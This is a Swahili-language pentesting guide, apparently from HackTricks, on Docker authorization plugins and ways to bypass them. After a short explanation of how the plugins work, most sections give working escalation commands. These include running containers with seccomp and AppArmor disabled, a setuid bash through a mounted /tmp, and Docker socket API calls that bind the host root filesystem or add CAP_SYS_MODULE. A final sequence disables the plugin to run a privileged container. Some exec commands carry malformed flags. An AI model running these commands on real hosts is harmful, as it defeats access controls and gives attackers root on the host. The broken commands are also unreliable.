{{#include ../../../banners/hacktricks-training.md}}

**Mfano wa** **idhini** wa **Docker** ni **kila kitu au hakuna**. Mtumiaji yeyote mwenye ruhusa ya kufikia **Docker daemon** anaweza **kufanya amri** yoyote ya mteja wa Docker. Hali hiyo hiyo inatumika kwa wito wanaotumia **Docker Engine API** kuwasiliana na daemon. Ikiwa unahitaji **udhibiti wa ufikiaji** zaidi, unaweza kuunda **vijitendo vya idhini** na kuviweka kwenye usanidi wa **Docker daemon** yako. Kwa kutumia kijitendo cha idhini, msimamizi wa Docker anaweza **kuunda sera za ufikiaji** za kina kwa ajili ya kusimamia ufikiaji wa **Docker daemon**.

# Msingi wa usanifu

Vijitendo vya Docker Auth ni **vijitendo vya nje** ambavyo unaweza kutumia **kuruhusu/kukataa** **vitendo** vinavyotakiwa kwa **Docker Daemon** **kulingana** na **mtumiaji** aliyeomba na **kitendo** **kilichotakiwa**.

**[Taarifa ifuatayo ni kutoka kwa nyaraka](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Wakati **ombile** la **HTTP** linapotolewa kwa **daemon** ya Docker kupitia CLI au kupitia **Engine API**, **safu ya uthibitishaji** **inasafirisha** ombi kwa **kijitendo** cha **uthibitishaji** kilichosakinishwa. Ombi lina mtumiaji (mwanakitu) na muktadha wa amri. **Kijitendo** kina jukumu la kuamua ikiwa **kuruhusu** au **kukataa** ombi.

Mchoro wa mfuatano hapa chini unaonyesha mtiririko wa idhini ya kuruhusu na kukataa:

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz_deny.png)

Kila ombi lililotumwa kwa kijitendo **linajumuisha mtumiaji aliyeidhinishwa, vichwa vya HTTP, na mwili wa ombi/jibu**. Ni **jina la mtumiaji** na **mbinu ya uthibitishaji** iliyotumika pekee ndizo zinazosafirishwa kwa kijitendo. Muhimu zaidi, **hakuna** akidi za mtumiaji au token zinazotumwa. Hatimaye, **sio kila mwili wa ombi/jibu unatumwa** kwa kijitendo cha idhini. Ni wale tu mwili wa ombi/jibu ambapo `Content-Type` ni `text/*` au `application/json` ndio unatumwa.

Kwa amri ambazo zinaweza kuweza kuingilia muunganisho wa HTTP (`HTTP Upgrade`), kama vile `exec`, kijitendo cha idhini kinaitwa tu kwa ombi la awali la HTTP. Mara kijitendo kinapokubali amri, idhini haitumiki kwa mtiririko wa mabaki. Kwa hakika, data ya mtiririko haitasafirishwa kwa vijitendo vya idhini. Kwa amri ambazo zinarejesha jibu la HTTP lililokatwa, kama vile `logs` na `events`, ni ombi la HTTP pekee ndilo linalotumwa kwa vijitendo vya idhini.

Wakati wa usindikaji wa ombi/jibu, baadhi ya mtiririko wa idhini yanaweza kuhitaji kufanya maswali ya ziada kwa **Docker daemon**. Ili kukamilisha mtiririko kama huo, vijitendo vinaweza kuita API ya daemon kama mtumiaji wa kawaida. Ili kuwezesha maswali haya ya ziada, kijitendo lazima kitoe njia kwa msimamizi kuunda sera sahihi za uthibitishaji na usalama.

## Vijitendo Vingi

Unawajibika kwa **kujiandikisha** kijitendo chako kama sehemu ya **kuanzisha** **Docker daemon**. Unaweza kusakinisha **vijitendo vingi na kuviunganisha pamoja**. Mnyororo huu unaweza kuagizwa. Kila ombi kwa daemon hupita kwa mpangilio kupitia mnyororo. Ni tu wakati **vijitendo vyote vinapokubali ufikiaji** wa rasilimali, ndipo ufikiaji unaruhusiwa.

# Mifano ya Kijitendo

## Twistlock AuthZ Broker

Kijitendo [**authz**](https://github.com/twistlock/authz) kinakuruhusu kuunda faili rahisi ya **JSON** ambayo **kijitendo** kitakuwa **kikisoma** ili kuidhinisha maombi. Hivyo, inakupa fursa ya kudhibiti kwa urahisi ni vipi **API endpoints** zinaweza kufikia kila mtumiaji.

Hii ni mfano ambao utaruhusu Alice na Bob kuunda kontena mpya: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Katika ukurasa [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) unaweza kupata uhusiano kati ya URL iliyotakiwa na kitendo. Katika ukurasa [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) unaweza kupata uhusiano kati ya jina la kitendo na kitendo.

## Mwongozo wa Kijitendo Rahisi

Unaweza kupata **kijitendo rahisi kueleweka** chenye taarifa za kina kuhusu usakinishaji na urekebishaji hapa: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Soma `README` na msimbo wa `plugin.go` ili kuelewa jinsi inavyofanya kazi.

# Docker Auth Plugin Bypass

## Kuorodhesha ufikiaji

Mambo makuu ya kuangalia ni **ni vipi endpoints zinazoruhusiwa** na **ni vipi thamani za HostConfig zinazoruhusiwa**.

Ili kufanya kuorodhesha hii unaweza **kutumia chombo** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**

## kukataa `run --privileged`

### Haki za chini
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Kukimbia kontena na kisha kupata kikao chenye mamlaka

Katika kesi hii, sysadmin **alipiga marufuku watumiaji kuunganisha volumu na kukimbia kontena kwa bendera `--privileged`** au kutoa uwezo wowote wa ziada kwa kontena:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Hata hivyo, mtumiaji anaweza **kuunda shell ndani ya kontena linalotembea na kutoa haki za ziada**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Sasa, mtumiaji anaweza kutoroka kutoka kwenye kontena akitumia yoyote ya [**mbinu zilizozungumziwa hapo awali**](./#privileged-flag) na **kuinua mamlaka** ndani ya mwenyeji.

## Mount Writable Folder

Katika kesi hii, sysadmin **amezuia watumiaji kuendesha kontena na bendera ya `--privileged`** au kutoa uwezo wowote wa ziada kwa kontena, na aliruhusu tu kuunganisha folda ya `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
> [!NOTE]
> Kumbuka kwamba huenda usiweze kuunganisha folda `/tmp` lakini unaweza kuunganisha **folda nyingine inayoweza kuandikwa**. Unaweza kupata directories zinazoweza kuandikwa kwa kutumia: `find / -writable -type d 2>/dev/null`
>
> **Kumbuka kwamba si directories zote katika mashine ya linux zitasaidia suid bit!** Ili kuangalia ni directories zipi zinasaidia suid bit, endesha `mount | grep -v "nosuid"` Kwa mfano kawaida `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` na `/var/lib/lxcfs` hazisaidii suid bit.
>
> Kumbuka pia kwamba ikiwa unaweza **kuunganisha `/etc`** au folda nyingine yoyote **iliyokuwa na faili za usanidi**, unaweza kuzibadilisha kutoka kwenye kontena la docker kama root ili **uzitumie kwenye mwenyeji** na kupandisha mamlaka (huenda ukibadilisha `/etc/shadow`)

## Unchecked API Endpoint

Wajibu wa sysadmin anayekonfigu plugin hii utakuwa kudhibiti ni vitendo vipi na kwa mamlaka zipi kila mtumiaji anaweza kufanya. Hivyo, ikiwa admin atachukua njia ya **blacklist** na endpoints na sifa zake huenda **akasahau baadhi yao** ambazo zinaweza kumruhusu mshambuliaji **kupandisha mamlaka.**

Unaweza kuangalia docker API katika [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Unchecked JSON Structure

### Binds in root

Inawezekana kwamba wakati sysadmin alikamilisha moto wa docker alikosa **kigezo muhimu** cha [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kama "**Binds**".\
Katika mfano ufuatao inawezekana kutumia makosa haya kuunda na kuendesha kontena linalounganisha folda ya mzizi (/) ya mwenyeji:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
> [!WARNING]
> Kumbuka jinsi katika mfano huu tunatumia **`Binds`** kama ufunguo wa kiwango cha juu katika JSON lakini katika API inaonekana chini ya ufunguo **`HostConfig`**

### Binds katika HostConfig

Fuata maelekezo sawa na **Binds katika root** ukifanya **ombile** kwa Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts in root

Fuata maelekezo sawa na yale ya **Binds in root** ukifanya **ombile** hili kwa Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

Fuata maelekezo sawa na **Binds in root** ukifanya **ombile** hili kwa Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Unchecked JSON Attribute

Inawezekana kwamba wakati sysadmin alipoandika moto wa docker alisahau kuhusu **sifa muhimu za parameter** ya [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kama "**Capabilities**" ndani ya "**HostConfig**". Katika mfano ufuatao inawezekana kutumia makosa haya kuunda na kuendesha kontena lenye uwezo wa **SYS_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
> [!NOTE]
> **`HostConfig`** ni ufunguo ambao kawaida unashikilia **privileges** **za kuvutia** za kutoroka kutoka kwenye kontena. Hata hivyo, kama tulivyozungumzia hapo awali, zingatia jinsi matumizi ya Binds nje yake pia yanavyofanya kazi na yanaweza kukuruhusu kupita vizuizi.

## Kuondoa Plugin

Ikiwa **sysadmin** **alipokosa** **kuzuia** uwezo wa **kuondoa** **plugin**, unaweza kutumia hii kufaidika na kuondoa kabisa!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Kumbuka ku **re-enable plugin baada ya kupandisha**, au **kuanzisha tena huduma ya docker hakutafanya kazi**!

## Maktaba ya Bypass ya Plugin ya Auth

- [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

{{#include ../../../banners/hacktricks-training.md}}
